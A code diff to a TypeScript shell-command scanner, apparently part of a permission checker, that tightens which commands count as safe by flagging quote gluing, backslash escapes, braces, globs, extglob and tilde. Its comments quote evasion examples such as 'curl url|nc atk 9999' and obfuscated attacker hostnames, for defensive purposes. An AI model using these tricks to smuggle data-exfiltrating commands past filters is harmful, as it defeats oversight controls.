@@ -395,6 +395,20 @@ type OperatorScan = {
 // operators inside quoted args or misses no-whitespace pipelines like
 // `curl url|nc atk 9999`, so we walk the string with POSIX quote/escape
 // rules instead.
+// Quote characters must sit at word boundaries on the descriptor path:
+// a quote glued to a word character concatenates fragments into one argv
+// word the literal text never shows (`https://"attacker.net"/x` arrives
+// as a single URL).
+function isQuoteGluedToWord(
+  command: string,
+  i: number,
+  opening: boolean,
+): boolean {
+  const neighbor = opening ? command[i - 1] : command[i + 1];
+  if (neighbor === undefined) return false;
+  return !/[\s;&|<>()]/.test(neighbor);
+}
+
 function scanShellOperators(
   command: string,
   allowDescriptorRedirect: boolean,
@@ -402,23 +416,40 @@ function scanShellOperators(
   let inSingle = false;
   let inDouble = false;
   let mergeCandidate = false;
-  // Live substitution anywhere in the command, or an unquoted newline (a
-  // command separator), reverts the merge `&` to its chaining
-  // classification — recognizing the redirect must not widen acceptance
-  // for forms the operator check rejected before it existed.
+  // Live substitution, runtime word expansion, or an unquoted newline (a
+  // command separator) anywhere in the command reverts the merge `&` to
+  // its chaining classification — the descriptor path admits only what
+  // its lexical scan can fully establish as argv.
   let activeExpansion = false;
   let unquotedNewline = false;
   for (let i = 0; i < command.length; i++) {
     const ch = command[i];
     if (!inSingle && ch === "\\" && i + 1 < command.length) {
+      // Any backslash outside single quotes can rewrite an argv word:
+      // escape removal (`attac\ker.net` → `attacker.net`), quote
+      // escaping, or a line continuation joining fragments
+      // (`https:` + `\` + newline + `//other.test` assembles a URL raw
+      // extraction never sees — inside double quotes too).
+      activeExpansion = true;
       i++;
       continue;
     }
+    // curl itself globs `{a,b}` / `[0-1]` URL operands — quoting makes an
+    // argument shell-inert, not destination-inert (a quoted `file://{a,b}`
+    // yields two requests) — and telling a URL operand from a
+    // brace-bearing payload takes curl-grammar parsing. The descriptor
+    // path stays narrower: no brace or bracket text in any quote state.
+    if (ch === "{" || ch === "}" || ch === "[" || ch === "]") {
+      activeExpansion = true;
+      continue;
+    }
     if (!inDouble && ch === "'") {
+      if (isQuoteGluedToWord(command, i, !inSingle)) activeExpansion = true;
       inSingle = !inSingle;
       continue;
     }
     if (!inSingle && ch === '"') {
+      if (isQuoteGluedToWord(command, i, !inDouble)) activeExpansion = true;
       inDouble = !inDouble;
       continue;
     }
@@ -441,6 +472,25 @@ function scanShellOperators(
     if (inDouble) continue;
     if (ch === "\n") {
       unquotedNewline = true;
+      continue;
+    }
+    // Unquoted `*`/`?` are shell pathname globs: patterns can match local
+    // directory trees (including a planted `https:/…` tree), so a slash
+    // in the word does not make them safe. Quoted forms stay supported —
+    // the shell passes them verbatim and curl does not glob on them.
+    if (ch === "*" || ch === "?") {
+      activeExpansion = true;
+      continue;
+    }
+    // Extglob paren forms (`+(…)`, `@(…)`, `!(…)`; `?(…)` and `*(…)` are
+    // covered above) — rejected conservatively rather than assuming the
+    // executor leaves extglob off. Word-initial unquoted `~` tilde-expands
+    // into a home path; mid-word (`https://example.com/~user`) it is literal.
+    if (
+      ((ch === "+" || ch === "@" || ch === "!") && command[i + 1] === "(") ||
+      (ch === "~" && (i === 0 || /\s/.test(command[i - 1] ?? "")))
+    ) {
+      activeExpansion = true;
       continue;
     }
     // Process substitution is live only unquoted.
